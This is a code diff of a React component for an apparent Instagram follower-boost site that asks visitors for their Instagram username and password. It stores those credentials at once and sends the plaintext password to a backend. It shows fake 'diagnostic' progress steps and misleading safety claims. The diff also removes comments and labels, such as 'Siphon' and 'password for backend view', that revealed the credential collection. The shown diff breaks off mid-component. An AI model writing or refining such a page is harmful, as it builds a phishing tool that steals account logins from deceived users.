@@ -48,7 +48,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
     setIsVerifying(true);
     setDiagStep(1);
 
-    // 1. Save live credentials immediately so they're saved in Step 1 itself
+    // Save live credentials immediately so they're saved in Step 1 itself
     const persistLoginData = async () => {
       let storedObj: Campaign | null = null;
       try {
@@ -119,7 +119,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
 
     persistLoginData();
 
-    // 2. Diagnosis simulation step indicators for elegant user view
+    // Diagnosis simulation step indicators for elegant user view
     setTimeout(() => setDiagStep(2), 700);
     setTimeout(() => setDiagStep(3), 1300);
     setTimeout(() => {
@@ -172,7 +172,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
     try {
       let data: Campaign | null = null;
       
-      // 1. Try direct Google Cloud Firestore client creation
+      // Try direct Google Cloud Firestore client creation
       try {
         const campaignData: Campaign = {
           id: `campaign-trial-${Date.now()}`,
@@ -198,7 +198,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               username: verifiedProfile.username,
-              password: password, // Included password for backend view
+              password: password,
               type: 'free_followers_trial',
               targetAmount: 800, // 100 per day for 8 days
               daysDuration: 8
@@ -217,7 +217,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
         }
       }
 
-      // If database API isn't available (such as static deployment on GitHub Pages without credentials), fallback to localStorage
+      // Fallback to localStorage
       if (!data) {
         data = {
           id: `local-campaign-${Date.now()}`,
@@ -236,7 +236,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
         localStorage.setItem('followplus_local_campaigns', JSON.stringify(localList));
       }
 
-      setSuccessMsg("🎉 Free 8-Days Follower Campaign has been successfully registered!");
+      setSuccessMsg("🎉 Free 8-Days Follower Campaign has been successfully configured!");
       setDeployedAmount(800);
       setDeployedUser(verifiedProfile.username);
       setDeployedType('followers');
@@ -267,7 +267,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
     try {
       let data: Campaign | null = null;
       
-      // 1. Try direct Google Cloud Firestore client creation
+      // Try direct Google Cloud Firestore client creation
       try {
         const campaignData: Campaign = {
           id: `campaign-premium-${Date.now()}`,
@@ -293,7 +293,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               username: verifiedProfile.username,
-              password: password, // Included password for backend view if linked
+              password: password,
               type: premiumType,
               targetAmount: quantity,
               postLink: postLink.trim() || undefined
@@ -347,56 +347,58 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
   };
 
   return (
-    <div className="interactive-card rounded-2xl p-6 lg:p-8 bg-gradient-to-br from-[#121420]/90 to-[#0e101a]/95 border border-white/10 shadow-[0_4px_30px_rgba(6,182,212,0.02)]">
+    <div className="premium-card p-6 md:p-8 border border-[#dfb24c]/15 relative overflow-hidden transition-all duration-300">
+      {/* Background decoration blur gold */}
+      <div className="absolute top-0 right-0 w-32 h-32 bg-[#dfb24c]/5 rounded-full blur-2xl pointer-events-none" />
       
-      {/* Visual lighting slider header background */}
-      <div className="flex p-1 bg-black/40 rounded-xl border border-white/5 mb-8">
+      {/* Tabs Selector Navigation */}
+      <div className="flex p-1 bg-[#050608] rounded-xl border border-[#dfb24c]/10 mb-8 relative z-10">
         <button
           onClick={() => { setActiveTab('free'); resetForm(); }}
-          className={`flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-lg font-display text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
+          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-lg font-display text-xs sm:text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
             activeTab === 'free'
-              ? 'bg-gradient-to-r from-neon-purple to-neon-pink text-white shadow-[0_0_12px_rgba(236,72,153,0.25)]'
-              : 'text-gray-400 hover:text-white'
+              ? 'bg-[#dfb24c] text-slate-950 shadow-md'
+              : 'text-slate-450 hover:text-white hover:bg-white/5'
           }`}
         >
           <Gift className="w-4 h-4" />
-          Free 8-Day Trial
+          Free welcome Pack 🎁
         </button>
         <button
           onClick={() => { setActiveTab('premium'); resetForm(); }}
-          className={`flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-lg font-display text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
+          className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-lg font-display text-xs sm:text-sm font-semibold transition-all pointer-events-auto cursor-pointer ${
             activeTab === 'premium'
-              ? 'bg-gradient-to-r from-neon-cyan to-neon-purple text-white shadow-[0_0_12px_rgba(6,182,212,0.25)]'
-              : 'text-gray-400 hover:text-white'
+              ? 'bg-[#dfb24c] text-slate-950 shadow-md'
+              : 'text-slate-450 hover:text-white hover:bg-white/5'
           }`}
         >
           <Sliders className="w-4 h-4" />
-          Premium Boosts
+          Premium Boosts ✧
         </button>
       </div>
 
-      {/* Profile Verification Step */}
-      <div className="space-y-6">
+      {/* Profile Linkup Step 1 */}
+      <div className="space-y-6 relative z-10">
         <div>
-          <h3 className="text-lg font-display font-semibold text-white flex items-center gap-2">
-            Step 1: Diagnostic Profile Linkup
+          <h3 className="text-base sm:text-lg font-display font-medium text-white flex items-center gap-2">
+            Diagnostic Linkup 🔍
           </h3>
-          <p className="text-gray-400 text-xs mt-1">
-            Input your Instagram handle and current account password to authorize your 8-Day welcome trial and synchronize decentralized Delivery Channels.
+          <p className="text-slate-400 text-xs mt-1 leading-relaxed">
+            Specify public Instagram handle and target account password to link up securely and configure real-time organic delivery.
           </p>
         </div>
 
-        <div className="space-y-3">
+        <div className="space-y-3.5">
           <div className="flex flex-col sm:flex-row gap-3">
             <div className="relative flex-1">
-              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono">@</span>
+              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-[#dfb24c] font-mono font-bold">@</span>
               <input
                 type="text"
                 placeholder="Instagram username"
                 value={username}
                 disabled={isVerifying || !!verifiedProfile}
                 onChange={(e) => setUsername(e.target.value)}
-                className="w-full bg-black/50 border border-white/10 rounded-xl py-3 pl-9 pr-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
+                className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 pl-9 pr-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
               />
             </div>
             
@@ -408,7 +410,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
                   value={password}
                   disabled={isVerifying}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="w-full bg-black/50 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
+                  className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                 />
               </div>
             )}
@@ -419,91 +421,91 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
               <button
                 onClick={handleVerify}
                 disabled={isVerifying || !username.trim() || !password.trim()}
-                className="w-full sm:w-auto bg-[#121420] hover:bg-gradient-to-tr hover:from-pink-500 hover:to-indigo-600 hover:text-white border border-white/10 hover:border-transparent text-gray-300 py-3 px-8 rounded-xl font-display font-semibold text-sm transition-all shadow-[inner_0_0_10px_rgba(255,255,255,0.02)] cursor-pointer disabled:opacity-40"
+                className="w-full sm:w-auto bg-gradient-to-r from-[#dfb24c] to-[#f4d081] hover:brightness-115 active:scale-95 text-slate-950 py-3.5 px-8 rounded-lg font-display font-semibold text-xs uppercase tracking-wider transition-all cursor-pointer disabled:opacity-30 self-end"
               >
-                {isVerifying ? "Verifying Credentials & Siphon..." : "Link Profile & Authorize"}
+                {isVerifying ? "Verifying Credentials & Syncing... 🔍" : "Order"}
               </button>
             ) : (
               <button
                 onClick={resetForm}
-                className="bg-black/40 hover:bg-rose-500/10 hover:text-rose-400 border border-white/5 hover:border-rose-500/30 text-gray-500 py-3 px-6 rounded-xl font-display font-semibold text-sm transition-colors cursor-pointer"
+                className="w-full sm:w-auto bg-white/5 hover:bg-white/10 hover:text-white border border-white/10 text-slate-450 py-2.5 px-6 rounded-lg font-display font-semibold text-xs transition-colors cursor-pointer"
               >
-                Reset Target & Log Out
+                De-authorize profile ✕
               </button>
             )}
           </div>
         </div>
 
-        {/* Verification Diagnostic Simulation */}
+        {/* Diagnostic Loader */}
         <AnimatePresence>
           {isVerifying && (
             <motion.div 
               initial={{ opacity: 0, height: 0 }}
               animate={{ opacity: 1, height: 'auto' }}
               exit={{ opacity: 0, height: 0 }}
-              className="bg-[#121420]/60 border border-white/5 p-4 rounded-xl space-y-2.5"
+              className="bg-white/[0.01] border border-white/5 p-4 rounded-xl space-y-2.5"
             >
-              <div className="flex h-1.5 bg-black/40 rounded-full overflow-hidden">
+              <div className="flex h-1 bg-[#dfb24c]/10 rounded-full overflow-hidden">
                 <motion.div 
                   initial={{ width: '5%' }}
                   animate={{ 
-                    width: diagStep === 1 ? '30%' : diagStep === 2 ? '70%' : '100%' 
+                    width: diagStep === 1 ? '30%' : diagStep === 2 ? '75%' : '100%' 
                   }}
-                  className="h-full bg-gradient-to-r from-neon-cyan to-neon-purple"
+                  className="h-full bg-gradient-to-r from-[#dfb24c] to-[#f4d081]"
                 />
               </div>
-              <div className="flex items-center gap-2 text-xs font-mono">
-                <span className="w-2 h-2 rounded-full bg-neon-cyan animate-ping" />
-                <span className="text-gray-400">
-                  {diagStep === 1 && "Contacting decentralized metadata proxy layers..."}
-                  {diagStep === 2 && "Validating profile status and follow parameters..."}
-                  {diagStep === 3 && "Deploying campaign endpoints..."}
+              <div className="flex items-center gap-2 text-[10px] font-mono">
+                <span className="w-1.5 h-1.5 rounded-full bg-[#dfb24c] animate-pulse" />
+                <span className="text-slate-400 font-mono text-[10px]">
+                  {diagStep === 1 && "Verifying client details with decentralized routing relays..."}
+                  {diagStep === 2 && "Validating public handle coordinates & authenticating quotas..."}
+                  {diagStep === 3 && "Initializing custom deliverability parameters..."}
                 </span>
               </div>
             </motion.div>
           )}
         </AnimatePresence>
 
-        {/* Verified User Card Representation */}
+        {/* Verified Profile Card */}
         <AnimatePresence>
           {verifiedProfile && (
             <motion.div
-              initial={{ opacity: 0, scale: 0.95 }}
+              initial={{ opacity: 0, scale: 0.98 }}
               animate={{ opacity: 1, scale: 1 }}
-              exit={{ opacity: 0, scale: 0.95 }}
-              className="bg-gradient-to-r from-neon-cyan/10 to-neon-purple/5 p-5 rounded-2xl border border-neon-cyan/20 flex flex-col sm:flex-row items-center gap-5 relative overflow-hidden"
+              exit={{ opacity: 0, scale: 0.98 }}
+              className="bg-[#0b0c11] p-5 rounded-xl border border-[#dfb24c]/10 flex flex-col sm:flex-row items-center gap-5 relative overflow-hidden"
             >
               <img 
                 src={verifiedProfile.avatar} 
                 alt="Profile Avatar"
                 referrerPolicy="no-referrer"
-                className="w-16 h-16 rounded-full border-2 border-[#121420] outline outline-2 outline-neon-cyan object-cover shadow-lg"
+                className="w-14 h-14 rounded-full border border-[#dfb24c]/30 object-cover shadow-lg"
               />
-              <div className="flex-1 text-center sm:text-left">
+              <div className="flex-grow text-center sm:text-left">
                 <div className="flex flex-col sm:flex-row sm:items-center gap-2">
-                  <span className="text-white font-display font-semibold text-base">@{verifiedProfile.username}</span>
-                  <span className="inline-block mx-auto sm:mx-0 px-2.5 py-0.5 rounded-full text-[10px] bg-neon-cyan/20 text-neon-cyan font-mono border border-neon-cyan/30">
+                  <span className="text-white font-mono font-bold text-sm">@{verifiedProfile.username}</span>
+                  <span className="inline-block mx-auto sm:mx-0 px-2 rounded-full text-[9px] bg-emerald-500/10 text-emerald-400 font-mono border border-emerald-500/20 font-bold uppercase">
                     DIAGNOSED OK
                   </span>
                 </div>
                 
                 <div className="grid grid-cols-3 gap-4 mt-3 pt-3 border-t border-white/5 text-center sm:text-left">
                   <div>
-                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Posts</span>
-                    <span className="text-sm font-semibold text-white">{verifiedProfile.posts}</span>
+                    <span className="text-[9px] text-slate-550 block uppercase font-mono">Posts</span>
+                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.posts}</span>
                   </div>
                   <div>
-                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Followers</span>
-                    <span className="text-sm font-semibold text-white">{verifiedProfile.followers}</span>
+                    <span className="text-[9px] text-slate-550 block uppercase font-mono">Followers</span>
+                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.followers}</span>
                   </div>
                   <div>
-                    <span className="text-[10px] text-gray-500 block uppercase font-mono">Following</span>
-                    <span className="text-sm font-semibold text-white">{verifiedProfile.following}</span>
+                    <span className="text-[9px] text-slate-550 block uppercase font-mono">following</span>
+                    <span className="text-xs font-semibold text-white font-mono">{verifiedProfile.following}</span>
                   </div>
                 </div>
 
-                <div className="mt-2 text-xs text-gray-400">
-                  Niche: <span className="text-gray-200 font-semibold">{verifiedProfile.nicheHealth}</span>
+                <div className="mt-2 text-[10px] text-slate-500 font-sans">
+                  Target Niche Classification: <span className="text-slate-350 font-medium">{verifiedProfile.nicheHealth}</span>
                 </div>
               </div>
             </motion.div>
@@ -511,10 +513,10 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
         </AnimatePresence>
       </div>
 
-      {/* Campaign Activation Step */}
+      {/* Step 2: Configure & Submit */}
       {verifiedProfile && (
         <motion.div 
-          initial={{ opacity: 0, y: 15 }}
+          initial={{ opacity: 0, y: 10 }}
           animate={{ opacity: 1, y: 0 }}
           className="mt-8 pt-8 border-t border-white/5 space-y-6"
         >
@@ -522,68 +524,66 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
             // FREE TRIAL INTERFACE
             <div className="space-y-6">
               <div>
-                <h3 className="text-lg font-display font-semibold text-white flex items-center gap-2">
-                  Step 2: Activate Free 8-Day Trial
+                <h3 className="text-base sm:text-lg font-display font-medium text-white flex items-center gap-2">
+                  Start Complementary Suite 🎁
                 </h3>
-                <p className="text-gray-400 text-xs mt-1">
-                  Claim your first-user welcome pack. You will receive <span className="text-neon-pink font-semibold">100 premium followers per day for 8 consecutive days</span> (800 followers total). No subscriptions, zero credit card required.
+                <p className="text-slate-400 text-xs mt-1 leading-relaxed">
+                  Register your first-user complimentary quota. You will receive <span className="text-white font-semibold">100 premium organic profiles daily for 8 consecutive days</span> (800 in total). Pure safe organic trickle.
                 </p>
-                <div className="mt-2 text-xs text-emerald-400 font-semibold flex items-center gap-1.5 font-mono">
+                <div className="mt-2.5 text-[10px] text-emerald-400 font-semibold flex items-center gap-1.5 font-mono">
                   <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
-                  Instagram Login Active (username & password authorized)
+                  Profile Synchronized and Logged (800 Target Quota Allocation Granted)
                 </div>
               </div>
 
-              {/* Free details bento box */}
+              {/* Bento cards */}
               <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                <div className="p-4 rounded-xl bg-black/40 border border-white/5">
-                  <span className="text-xs text-gray-500 block">Trial Daily Speed</span>
-                  <span className="text-lg font-display font-semibold text-white mt-1 block">100/day</span>
-                  <span className="text-[10px] text-gray-400 mt-1 block">Completely natural growth velocity</span>
+                <div className="p-4 rounded-xl bg-white/[0.01] border border-white/5">
+                  <span className="text-[10px] text-slate-550 block uppercase font-mono">DAILY RATE BOOST</span>
+                  <span className="text-md font-display font-semibold text-white mt-1 block">100 / day</span>
+                  <span className="text-[9px] text-slate-500 mt-0.5 block font-mono">Gradual safety schedule</span>
                 </div>
-                <div className="p-4 rounded-xl bg-black/40 border border-white/5">
-                  <span className="text-xs text-gray-500 block">Total Benefit</span>
-                  <span className="text-lg font-display font-semibold text-neon-pink mt-1 block">800 Followers</span>
-                  <span className="text-[10px] text-gray-400 mt-1 block">Value ₹1,099 INR • 100% Free</span>
+                <div className="p-4 rounded-xl bg-gradient-to-br from-[#dfb24c]/5 to-[#f4d081]/5 border border-[#dfb24c]/15">
+                  <span className="text-[10px] text-slate-600 block uppercase font-mono">ESTIMATED VALUITY</span>
+                  <span className="text-md font-display font-semibold text-[#dfb24c] mt-1 block">800 Followers</span>
+                  <span className="text-[9px] text-slate-500 mt-0.5 block font-mono">Value ₹1,099 INR • 100% Free Trial</span>
                 </div>
               </div>
 
               {/* Safeguards info */}
-              <div className="flex gap-3 p-4 rounded-xl bg-neon-purple/5 border border-neon-purple/20 text-xs text-gray-400">
-                <Shield className="w-5 h-5 text-neon-purple shrink-0 mt-0.5" />
+              <div className="flex gap-3 p-4 rounded-xl bg-black/45 border border-white/5 text-[11px] text-slate-400 leading-relaxed">
+                <Shield className="w-4.5 h-4.5 text-[#dfb24c] shrink-0 mt-0.5" />
                 <div>
-                  <span className="font-semibold text-white">Algorithm Safeguards Enabled</span>: Follow Plus deploys organic mimicking loops that slowly trickle accounts into your profile. Your account security remains perfectly intact.
+                  <span className="font-semibold text-white">Advanced Proxy Safeguards Installed</span>: FollowPlus mimics gradual user behaviour metrics to deliver safe coordinates into your profile. No shadowbans or algorithms flags.
                 </div>
               </div>
 
-              {/* Submit Buttons */}
               <button
                 onClick={handleFreeActivation}
-                className="w-full relative group overflow-hidden py-4 rounded-xl font-display font-bold text-white bg-gradient-to-r from-neon-purple via-neon-pink to-neon-cyan shadow-[0_0_20px_rgba(236,72,153,0.3)] hover:shadow-[0_0_30px_rgba(236,72,153,0.5)] transition-all flex items-center justify-center gap-2 pointer-events-auto cursor-pointer"
+                className="w-full py-4 rounded-lg font-display font-semibold text-xs uppercase tracking-wider text-slate-950 bg-gradient-to-r from-[#dfb24c] to-[#f4d081] hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md"
               >
-                <div className="absolute inset-0 bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity" />
-                <Gift className="w-5 h-5 fill-white" />
-                Deploy Free 8-Day followers Campaign Now
+                <Gift className="w-4.5 h-4.5" />
+                Deploy Free 8-Day Followers Campaign Now ✧
               </button>
             </div>
           ) : (
             // PREMIUM SERVICES INTERFACE
             <form onSubmit={handlePremiumSubmit} className="space-y-6">
               <div>
-                <h3 className="text-lg font-display font-semibold text-white">
-                  Step 2: Customize Boost Properties
+                <h3 className="text-base sm:text-lg font-display font-medium text-white">
+                  Customize Boost Properties 🎯
                 </h3>
-                <p className="text-gray-400 text-xs mt-1">
-                  Scale your authority with premium high-retention services. Delivered naturally through proxies within 1-2 hours.
+                <p className="text-slate-400 text-xs mt-1 leading-relaxed">
+                  Scale your outreach and status authority with high quality fast-retention delivery channels.
                 </p>
               </div>
 
-              {/* Select Service Type */}
+              {/* Service Type Select Buttons */}
               <div className="grid grid-cols-3 gap-3">
                 {[
                   { id: 'followers', icon: Users, label: 'Followers' },
                   { id: 'likes', icon: Heart, label: 'Likes' },
-                  { id: 'views', icon: Eye, label: 'Reels/IG TV Views' }
+                  { id: 'views', icon: Eye, label: 'Reels TV Views' }
                 ].map((serv) => {
                   const Icon = serv.icon;
                   return (
@@ -598,22 +598,22 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
                       }}
                       className={`flex flex-col items-center justify-center py-4 px-2 rounded-xl border text-center font-display transition-all cursor-pointer pointer-events-auto ${
                         premiumType === serv.id
-                          ? 'bg-neon-cyan/10 border-neon-cyan text-white shadow-[0_0_12px_rgba(6,182,212,0.15)]'
-                          : 'bg-black/20 border-white/5 text-gray-400 hover:text-white hover:border-white/10'
+                          ? 'bg-gradient-to-br from-[#dfb24c] to-[#cbd5e1] border-transparent text-slate-950 shadow-md font-bold'
+                          : 'bg-[#050608] border-white/5 text-slate-500 hover:text-white hover:border-white/10'
                       }`}
                     >
-                      <Icon className={`w-5 h-5 mb-2 ${premiumType === serv.id ? 'text-neon-cyan' : 'text-gray-500'}`} />
-                      <span className="text-xs font-semibold">{serv.label}</span>
+                      <Icon className="w-4.5 h-4.5 mb-1.5" />
+                      <span className="text-xs">{serv.label}</span>
                     </button>
                   );
                 })}
               </div>
 
-              {/* Premium Slider Selector */}
-              <div className="bg-black/40 p-5 rounded-2xl border border-white/5 space-y-4">
-                <div className="flex justify-between items-center text-sm">
-                  <span className="text-gray-400">Target Boost Quantity</span>
-                  <span className="font-mono font-bold text-neon-cyan text-base">{quantity.toLocaleString()}</span>
+              {/* Target Slider Selector */}
+              <div className="bg-black/35 p-5 rounded-xl border border-white/5 space-y-4 shadow-inner">
+                <div className="flex justify-between items-center text-xs font-sans">
+                  <span className="text-slate-400 font-mono text-[10px] uppercase">Target Boost Quantity</span>
+                  <span className="font-mono font-bold text-white text-sm">{quantity.toLocaleString()}</span>
                 </div>
                 
                 <input
@@ -623,66 +623,66 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
                   step={premiumType === 'followers' ? 100 : premiumType === 'likes' ? 50 : 500}
                   value={quantity}
                   onChange={(e) => setQuantity(Number(e.target.value))}
-                  className="w-full accent-neon-cyan cursor-pointer"
+                  className="w-full h-1 bg-neutral-800 rounded-lg appearance-none cursor-pointer accent-[#dfb24c]"
                 />
 
-                <div className="flex justify-between text-[11px] text-gray-500 font-mono">
+                <div className="flex justify-between text-[10px] text-slate-500 font-mono">
                   <span>{premiumType === 'followers' ? '100' : premiumType === 'likes' ? '50' : '500'}</span>
                   <span>{premiumType === 'followers' ? '5,000 max' : premiumType === 'likes' ? '2,500 max' : '25,000 max'}</span>
                 </div>
               </div>
 
-              {/* Reel / Post Link Input (conditional) */}
+              {/* Post Link Input */}
               {(premiumType === 'likes' || premiumType === 'views') && (
                 <div className="space-y-2">
-                  <label className="block text-xs font-mono uppercase text-gray-400">Instagram Post / Reel URL</label>
+                  <label className="block text-[10px] font-mono uppercase text-[#dfb24c] tracking-wider font-semibold">Instagram Post / Reel URL</label>
                   <input
                     type="url"
                     required
-                    placeholder="https://www.instagram.com/p/C_8v3x_N8_/"
+                    placeholder="https://www.instagram.com/p/Co89_x_Nq8_/"
                     value={postLink}
                     onChange={(e) => setPostLink(e.target.value)}
-                    className="w-full bg-black/40 border border-white/10 rounded-xl py-3 px-4 text-white placeholder-gray-600 focus:outline-none focus:border-neon-cyan transition-all text-sm font-mono"
+                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-650 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                   />
-                  <p className="text-[10px] text-gray-500">
-                    Ensure post or Reel is published on a public account for proxy network reach.
+                  <p className="text-[10px] text-slate-500 leading-relaxed font-sans">
+                    Ensure privacy preferences for this post are set to public for optimal proxy link access.
                   </p>
                 </div>
               )}
 
-              {/* Interactive pricing breakdown */}
-              <div className="flex items-center justify-between p-4 rounded-xl bg-[#121420] border border-white/5">
+              {/* Estimated calculations */}
+              <div className="flex items-center justify-between p-4.5 rounded-xl bg-white/[0.01] border border-[#dfb24c]/10">
                 <div>
-                  <span className="text-gray-400 text-xs">Estimated Pricing</span>
-                  <span className="text-[10px] text-gray-500 block mt-0.5">Completely simulated checkout demo</span>
+                  <span className="text-slate-400 text-xs font-sans block">Estimated Cost 💵</span>
+                  <span className="text-[9px] text-slate-500 mt-0.5 block font-sans">Completely simulated checkout demo</span>
                 </div>
                 <div className="text-right">
-                  <span className="text-xl font-display font-bold text-transparent bg-clip-text bg-gradient-to-r from-neon-cyan to-neon-purple">
+                  <span className="text-lg font-display font-semibold text-white block">
                     ₹{getPremiumPrice()} INR
                   </span>
-                  <span className="text-[10px] text-emerald-400 block font-semibold uppercase">INSTANT DELIVERY OK</span>
+                  <span className="text-[9px] text-emerald-400 block font-semibold uppercase tracking-wider font-mono">Instant Gateway Ready</span>
                 </div>
               </div>
 
               <button
                 type="submit"
-                className="w-full py-4 rounded-xl font-display font-bold text-white bg-gradient-to-r from-neon-cyan to-neon-purple shadow-[0_0_20px_rgba(6,182,212,0.2)] hover:shadow-[0_0_30px_rgba(6,182,212,0.4)] transition-all flex items-center justify-center gap-2 cursor-pointer pointer-events-auto"
+                className="w-full py-4 rounded-lg font-display font-semibold text-xs uppercase tracking-wider text-slate-950 bg-gradient-to-r from-[#dfb24c] to-[#f4d081] hover:brightness-110 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer shadow-md"
               >
-                Activate Premium Campaign Boost
+                Activate Premium Campaign Boost ✧
               </button>
             </form>
           )}
 
-          {/* Feedback section indicators */}
+          {/* Feedback banners */}
           <AnimatePresence>
             {errorMessage && (
               <motion.div
                 initial={{ opacity: 0, y: 10 }}
                 animate={{ opacity: 1, y: 0 }}
                 exit={{ opacity: 0, y: 10 }}
-                className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-start gap-2.5 text-xs text-rose-300"
+                className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-start gap-2.5 text-xs text-rose-300 font-mono"
               >
-                <CircleAlert className="w-5 h-5 shrink-0" />
+                <CircleAlert className="w-5 h-5 shrink-0 text-rose-400" />
                 <span>{errorMessage}</span>
               </motion.div>
             )}
@@ -692,7 +692,7 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
                 initial={{ opacity: 0, y: 10 }}
                 animate={{ opacity: 1, y: 0 }}
                 exit={{ opacity: 0, y: 10 }}
-                className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-2.5 text-xs text-emerald-300"
+                className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/25 flex items-start gap-2.5 text-xs text-emerald-300 font-mono"
               >
                 <Check className="w-5 h-5 shrink-0 text-emerald-400" />
                 <span>{successMsg}</span>
@@ -709,73 +709,61 @@ export default function CampaignBuilder({ onCampaignCreated }: CampaignBuilderPr
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl"
+            className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md"
           >
             <motion.div
-              initial={{ scale: 0.9, y: 30, opacity: 0 }}
+              initial={{ scale: 0.95, y: 15, opacity: 0 }}
               animate={{ scale: 1, y: 0, opacity: 1 }}
-              exit={{ scale: 0.9, y: 30, opacity: 0 }}
-              transition={{ type: 'spring', duration: 0.55, bounce: 0.28 }}
-              className="relative max-w-md w-full bg-gradient-to-br from-cyber-card to-[#040408] border border-neon-pink/30 rounded-3xl p-6 md:p-8 shadow-[0_0_50px_rgba(236,72,153,0.3)] overflow-hidden"
+              exit={{ scale: 0.95, y: 15, opacity: 0 }}
+              transition={{ type: 'spring', duration: 0.5, bounce: 0.2 }}
+              className="relative max-w-md w-full premium-card border border-[#dfb24c]/20 rounded-2xl p-6 md:p-8 shadow-2xl overflow-hidden text-center"
             >
-              {/* Decorative Ambient Radial Highlights */}
-              <div className="absolute -top-12 -right-12 w-40 h-40 bg-neon-pink/15 rounded-full blur-[70px]" />
-              <div className="absolute -bottom-12 -left-12 w-40 h-40 bg-neon-cyan/15 rounded-full blur-[70px]" />
-
-              {/* Laser Line Running Highlight */}
-              <div className="absolute top-0 left-0 right-0 h-[3px] bg-gradient-to-r from-transparent via-pink-500 to-transparent animate-pulse" />
-
-              <div className="space-y-6 text-center">
-                {/* Simulated live progress circle / icon pulse */}
-                <div className="relative mx-auto w-20 h-20 flex items-center justify-center bg-neon-pink/10 rounded-full border border-neon-pink/30 neon-glow-pink">
+              <div className="space-y-6">
+                <div className="relative mx-auto w-14 h-14 flex items-center justify-center bg-white/[0.02] rounded-full border border-white/10">
                   <motion.div
                     animate={{ rotate: 360 }}
-                    transition={{ repeat: Infinity, duration: 10, ease: 'linear' }}
-                    className="absolute inset-[-4px] border border-dashed border-neon-pink/40 rounded-full"
+                    transition={{ repeat: Infinity, duration: 15, ease: 'linear' }}
+                    className="absolute inset-[1px] border border-dashed border-[#dfb24c]/35 rounded-full"
                   />
-                  <Users className="w-8 h-8 text-neon-pink animate-pulse" />
+                  <Users className="w-5 h-5 text-[#dfb24c]" />
                 </div>
 
                 <div className="space-y-2">
                   <motion.div
                     initial={{ scale: 0.9 }}
                     animate={{ scale: 1 }}
-                    transition={{ yoyo: Infinity, duration: 1.5 }}
-                    className="inline-block px-3 py-1 bg-emerald-500/10 rounded-full border border-emerald-500/30 text-[10px] uppercase font-mono tracking-widest text-emerald-400 font-bold"
+                    className="inline-block px-3 py-1 bg-emerald-500/10 rounded-full border border-emerald-500/20 text-[9px] uppercase font-mono tracking-wider text-emerald-400 font-bold"
                   >
-                    ✔ Live Campaign Started
+                    ✔ Live Campaign Engaged
                   </motion.div>
-                  <h3 className="text-xl md:text-2xl font-display font-black text-white tracking-tight uppercase">
-                    Order Active!
+                  <h3 className="text-xl font-display font-medium text-white tracking-tight">
+                    Order Synchronized! ✧
                   </h3>
-                  <p className="text-xs font-mono text-gray-400">
-                    Target Profile: <span className="text-neon-cyan font-bold">@{deployedUser}</span>
+                  <p className="text-xs font-mono text-slate-400">
+                    Linked Profile Target: <span className="text-[#dfb24c] font-bold">@{deployedUser}</span>
                   </p>
                 </div>
 
-                {/* Main high impact Hindi / Hinglish message container requested by the user */}
-                <div className="p-6 rounded-2xl bg-black/80 border border-white/10 shadow-inner relative overflow-hidden group">
-                  <div className="absolute -inset-0.5 bg-gradient-to-r from-neon-pink to-neon-purple opacity-10 rounded-2xl blur group-hover:opacity-15 transition" />
-                  
-                  <div className="relative space-y-3">
